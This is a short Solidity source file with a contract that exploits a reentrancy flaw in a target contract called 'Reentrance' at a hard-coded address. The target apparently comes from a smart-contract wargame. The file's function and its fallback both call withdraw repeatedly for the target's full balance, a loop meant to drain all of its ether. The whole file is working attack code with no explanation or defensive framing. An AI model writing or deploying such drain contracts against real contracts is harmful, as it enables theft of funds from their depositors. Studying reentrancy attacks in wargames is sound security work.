// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Renter {

    IReentrance public constant reentrance = IReentrance(0x86ED6fCF3681A20AD4CC0D205119d08413bacFac);

    function gm() external payable {
        uint256 victimBalance = address(reentrance).balance;
        reentrance.withdraw(victimBalance);
    }

    fallback() external payable {
        uint256 victimBalance = address(reentrance).balance;
        if (victimBalance > 0) {
            reentrance.withdraw(victimBalance);
        }
    }
}